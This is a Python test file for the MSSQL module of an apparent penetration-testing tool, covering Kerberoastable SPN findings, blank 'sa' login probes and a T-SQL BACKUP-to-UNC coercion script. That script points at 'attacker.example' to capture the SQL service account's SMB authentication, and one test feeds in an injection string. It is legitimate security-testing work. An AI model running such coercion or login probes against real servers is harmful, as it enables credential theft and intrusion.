"""Native additions to the MSSQL module: MSSQLSvc kerberoast SPN emission
(driven by the pre-auth NTLM leak) and BACKUP-to-UNC coercion T-SQL. Both
are wire-derived: MS-KILE / SQL Server BOL for the SPN string shape, and
T-SQL BACKUP/RESTORE reference for the coercion path."""

from __future__ import annotations

import unittest

from recce.core.models import Host, Port
from recce.services.db import mssql


def _host(port: int = 1433, service: str = "ms-sql-s") -> Host:
    return Host(ip="127.0.0.1",
                ports=[Port(portid=port, service=service, state="open")])


class KerberoastSpn(unittest.TestCase):
    """MSSQLSvc/<fqdn>:<port> for the default instance, MSSQLSvc/<fqdn>:<instance>
    for a named instance; empty when the NTLM leak did not give us the FQDN."""

    def test_default_instance_uses_port(self):
        nt = {"dns_computer": "sql01.contoso.local",
              "dns_domain": "contoso.local", "nb_domain": "CONTOSO"}
        self.assertEqual(mssql.kerberoast_spn(nt, 1433),
                         "MSSQLSvc/sql01.contoso.local:1433")

    def test_named_instance_uses_instance(self):
        nt = {"dns_computer": "sql01.contoso.local"}
        self.assertEqual(mssql.kerberoast_spn(nt, 1433, instance="PROD"),
                         "MSSQLSvc/sql01.contoso.local:PROD")

    def test_non_default_port_flows_through(self):
        nt = {"dns_computer": "sql01.contoso.local"}
        self.assertEqual(mssql.kerberoast_spn(nt, 14330),
                         "MSSQLSvc/sql01.contoso.local:14330")

    def test_no_fqdn_returns_empty(self):
        # Only NetBIOS - no FQDN -> no SPN we can hand out (the pre-auth leak
        # didn't give us enough for a valid MSSQLSvc target).
        self.assertEqual(mssql.kerberoast_spn({"nb_computer": "SQL01"}), "")
        self.assertEqual(mssql.kerberoast_spn({}), "")
        self.assertEqual(mssql.kerberoast_spn(None), "")

    def test_finding_emitted_when_pre_auth_ntlm_leak_has_fqdn(self):
        # findings() ingests a probes dict keyed 'ip:port' -> {"ntlm":..., "prelogin":...}.
        # A pre-auth NTLM leak carrying dns_computer must produce a
        # mssql_kerberoastable_spn finding, medium severity, with the SPN in
        # the command and the FQDN + domain in the detail.
        h = _host(1433)
        nt = {"dns_computer": "sql01.contoso.local",
              "dns_domain": "contoso.local", "nb_domain": "CONTOSO",
              "nb_computer": "SQL01"}
        fs = mssql.findings(
            [h], {"127.0.0.1:1433": {"ntlm": nt, "prelogin": {}}})
        kf = [f for f in fs if f["kind"] == "mssql_kerberoastable_spn"]
        self.assertEqual(len(kf), 1)
        f = kf[0]
        self.assertEqual(f["severity"], "medium")
        self.assertEqual(f["target"], "127.0.0.1:1433")
        self.assertIn("MSSQLSvc/sql01.contoso.local:1433", f["command"])
        self.assertIn("sql01.contoso.local", f["detail"])
        self.assertIn("contoso.local", f["detail"])
        # narrative from _NARRATIVE is folded onto the finding, not silent.
        self.assertIn("Kerberos", f["narrative"])

    def test_no_finding_when_ntlm_leak_lacks_fqdn(self):
        # NetBIOS-only leak (or NTLM failed altogether) must not emit the
        # kerberoast finding - we would be inventing an SPN we cannot verify.
        h = _host(1433)
        for nt in ({"nb_domain": "CONTOSO"}, {}, None):
            probes = {"127.0.0.1:1433": {"ntlm": nt or {}, "prelogin": {}}}
            fs = mssql.findings([h], probes)
            kinds = {f["kind"] for f in fs}
            self.assertNotIn("mssql_kerberoastable_spn", kinds,
                             f"unexpected kerberoast finding for ntlm={nt!r}")


class BackupUncCoercion(unittest.TestCase):
    """T-SQL BACKUP DATABASE / RESTORE VERIFYONLY as a coercion primitive:
    the payload must reach out to the attacker share so SMB auth is
    attempted with the SQL service account (regardless of the backup
    itself failing on the far side)."""

    def test_script_contains_both_coercion_primitives(self):
        script = mssql.build_backup_unc_script("attacker.example")
        self.assertIn("BACKUP DATABASE master TO DISK", script)
        self.assertIn("RESTORE VERIFYONLY FROM DISK", script)
        # UNC path renders both leading backslashes (Python literal '\\\\' -> '\\\\'
        # rendered = '\\\\' - i.e. the on-wire two backslashes MSSQL needs).
        self.assertIn("\\\\attacker.example\\recce", script)
        # TRY/CATCH so BACKUP failing doesn't abort the RESTORE half.
        self.assertEqual(script.count("BEGIN TRY"), 2)
        self.assertEqual(script.count("BEGIN CATCH"), 2)
        # Terminated with exit so the batch actually runs under mssqlclient.
        self.assertTrue(script.strip().endswith("exit"))

    def test_script_uses_custom_share(self):
        script = mssql.build_backup_unc_script("10.10.10.10", share="loot")
        self.assertIn("\\\\10.10.10.10\\loot\\recce_backup.bak", script)

    def test_share_and_lhost_are_sanitised(self):
        # Single quotes and backslashes in operator input would either break
        # the T-SQL literal or (worse) let an injected value split into a
        # second UNC path. They're stripped before the literal is built.
        script = mssql.build_backup_unc_script("evil'; DROP",
                                               share="lo\\ot'sh")
        # No stray single quote appears mid-literal after sanitising.
        # Every ' in the script is the outer literal boundary or the
        # ERROR_MESSAGE() sentinel below - count them and check parity.
        # (Simplest robust check: no substring "'; DROP" survives.)
        self.assertNotIn("'; DROP", script)
        self.assertNotIn("\\ot", script)

    def test_share_default_when_blank(self):
        # Blank share must fall back to the default so the UNC path is valid
        # and does not collapse to "\\host\\<file>" (which is not a share).
        script = mssql.build_backup_unc_script("h", share="")
        self.assertIn("\\\\h\\recce\\recce_backup.bak", script)

    def test_runner_gates_on_impacket_availability(self):
        # No impacket-mssqlclient installed -> the runner must return
        # (False, "impacket-mssqlclient not installed") rather than raising
        # or silently succeeding. Mirrors run_xp_dirtree's contract so
        # callers can treat both coercion primitives identically.
        from unittest.mock import patch
        with patch.object(mssql, "_mssqlclient_cmd", return_value=None):
            ok, err = mssql.run_backup_unc("10.0.0.1", {"user": "u", "secret": "p"},
                                           "attacker.example")
        self.assertFalse(ok)
        self.assertIn("impacket-mssqlclient", err)


class BlankLoginProbeT2(unittest.TestCase):
    """T2 safe proof-of-exploit for the blank/default MSSQL login.

    The probe: sqlauth_login (LOGINACK) + a fresh PRELOGIN read of the
    server's own ProductVersion banner. Non-destructive, single auth
    attempt, bounded timeout — corroborating banner as evidence."""

    def test_probe_ok_returns_version_and_ok(self):
        # Vulnerable target: LOGINACK returns True, PRELOGIN parses a
        # server version → probe returns ok=True with the exact banner in
        # `version` and both facts in `detail` for the report.
        from unittest.mock import patch
        with patch.object(mssql, "sqlauth_login",
                          return_value=(True, "LOGINACK")), \
             patch.object(mssql, "prelogin",
                          return_value={"version": "15.0.4360.2",
                                        "encryption": "on"}):
            r = mssql.blank_login_probe("10.0.0.1", 1433, "sa", "")
        self.assertTrue(r["ok"])
        self.assertEqual(r["version"], "15.0.4360.2")
        self.assertIn("15.0.4360.2", r["detail"])
        self.assertIn("(blank)", r["detail"])           # empty pw rendered

    def test_probe_auth_fail_stays_negative(self):
        # Patched target: sa/blank rejected — probe returns ok=False and
        # never surfaces a version, so the caller keeps tier=T1 (or emits
        # nothing at all). detail carries the LOGINACK-failure text.
        from unittest.mock import patch
        with patch.object(mssql, "sqlauth_login",
                          return_value=(False, "Login failed for user 'sa'.")), \
             patch.object(mssql, "prelogin") as pl:
            r = mssql.blank_login_probe("10.0.0.1", 1433, "sa", "")
        self.assertFalse(r["ok"])
        self.assertEqual(r["version"], "")
        self.assertIn("Login failed", r["detail"])
        # PRELOGIN not called when auth already failed — one round-trip
        # for a proven-negative target, no extra noise on the wire.
        pl.assert_not_called()

    def test_probe_timeout_clean_negative(self):
        # Unreachable target: sqlauth_login itself returns
        # (False, 'connect error: ...') when the socket can't be opened.
        # The probe must propagate that cleanly — no exception escapes.
        from unittest.mock import patch
        with patch.object(mssql, "sqlauth_login",
                          return_value=(False, "connect error: timed out")):
            r = mssql.blank_login_probe("10.99.99.99", 1433, "sa", "",
                                        timeout=0.1)
        self.assertFalse(r["ok"])
        self.assertEqual(r["version"], "")
        self.assertIn("connect error", r["detail"])

    def test_probe_auth_ok_but_no_version_stays_t1(self):
        # LOGINACK held but PRELOGIN gave us nothing — the exploit was
        # proven but the corroborating banner is missing. Keep ok=False
        # so the finding stays at T1: T2 requires *server-side* evidence.
        from unittest.mock import patch
        with patch.object(mssql, "sqlauth_login",
                          return_value=(True, "LOGINACK")), \
             patch.object(mssql, "prelogin", return_value={}):
            r = mssql.blank_login_probe("10.0.0.1", 1433, "sa", "")
        self.assertFalse(r["ok"])
        self.assertIn("PRELOGIN version parse failed", r["detail"])

    def test_probe_passes_arguments_through(self):
        # user/port/timeout must reach the underlying sqlauth_login +
        # prelogin calls verbatim; otherwise the probe would silently
        # test a different endpoint than what the caller asked for.
        from unittest.mock import patch
        with patch.object(mssql, "sqlauth_login",
                          return_value=(True, "LOGINACK")) as sla, \
             patch.object(mssql, "prelogin",
                          return_value={"version": "16.0.1"}) as pl:
            mssql.blank_login_probe("192.0.2.5", 14330, "sa", "",
                                    timeout=2.5)
        sla.assert_called_once_with("192.0.2.5", 14330, "sa", "",
                                    timeout=2.5)
        pl.assert_called_once_with("192.0.2.5", 14330, timeout=2.5)


class BlankLoginFindingsWiring(unittest.TestCase):
    """findings() promotes blank_login to T2 when the probe result is in
    probes[tgt]['blank_verified'] with ok=True; otherwise T1 as before."""

    def _mssql_host_with_blank_script(self):
        # Real 'Login Success' output — the T1 nmap-signal path.
        from recce.core.models import Script
        p = Port(portid=1433, protocol="tcp", state="open", service="ms-sql-s")
        p.scripts.append(Script(id="ms-sql-empty-password",
                                output=("[DBSERVER01\\SQLEXPRESS]\n"
                                        "  sa:<empty password> => Login Success")))
        return Host(ip="10.0.0.9", ports=[p])

    def test_blank_verified_upgrades_to_t2(self):
        h = self._mssql_host_with_blank_script()
        probes = {"10.0.0.9:1433": {
            "prelogin": {}, "ntlm": {},
            "blank_verified": {"ok": True, "version": "15.0.4360.2",
                               "detail": "LOGINACK confirmed with 'sa'/(blank); "
                                         "server ProductVersion 15.0.4360.2"},
        }}
        fs = mssql.findings([h], probes)
        blank = [f for f in fs if f["kind"] == "blank_login"]
        self.assertEqual(len(blank), 1)
        f = blank[0]
        self.assertEqual(f.get("depth_tier"), "t2")
        # Evidence text — the actual server-side banner — must land in detail.
        self.assertIn("15.0.4360.2", f["detail"])
        self.assertIn("Native TDS proof", f["detail"])

    def test_no_probe_stays_t1(self):
        # nmap-signal blank + probe never ran (e.g. active=False, or the
        # weak_sa_sweep gate didn't fire) → the finding still emits but
        # stays at T1 with no PRELOGIN banner attached.
        h = self._mssql_host_with_blank_script()
        probes = {"10.0.0.9:1433": {"prelogin": {}, "ntlm": {}}}
        fs = mssql.findings([h], probes)
        blank = [f for f in fs if f["kind"] == "blank_login"]
        self.assertEqual(len(blank), 1)
        self.assertEqual(blank[0].get("depth_tier"), "t1")
        self.assertNotIn("Native TDS proof", blank[0]["detail"])

    def test_probe_ok_false_stays_t1(self):
        # blank_verified present but ok=False (LOGINACK held, PRELOGIN
        # version parse failed) → do not promote to T2.
        h = self._mssql_host_with_blank_script()
        probes = {"10.0.0.9:1433": {
            "prelogin": {}, "ntlm": {},
            "blank_verified": {"ok": False, "version": "",
                               "detail": "LOGINACK confirmed; version parse failed"},
        }}
        fs = mssql.findings([h], probes)
        blank = [f for f in fs if f["kind"] == "blank_login"]
        self.assertEqual(len(blank), 1)
        self.assertEqual(blank[0].get("depth_tier"), "t1")

    def test_blank_verified_alone_can_emit_finding(self):
        # Native probe hit (ok=True) with NO nmap script signal at all
        # still emits the blank_login finding at T2 — the T1 signal was
        # historically nmap-only, the promotion untethers it from NSE.
        p = Port(portid=1433, protocol="tcp", state="open", service="ms-sql-s")
        h = Host(ip="10.0.0.9", ports=[p])
        probes = {"10.0.0.9:1433": {
            "prelogin": {}, "ntlm": {},
            "blank_verified": {"ok": True, "version": "15.0.4360.2",
                               "detail": "LOGINACK confirmed with 'sa'/(blank); "
                                         "server ProductVersion 15.0.4360.2"},
        }}
        fs = mssql.findings([h], probes)
        blank = [f for f in fs if f["kind"] == "blank_login"]
        self.assertEqual(len(blank), 1)
        self.assertEqual(blank[0].get("depth_tier"), "t2")


if __name__ == "__main__":
    unittest.main()
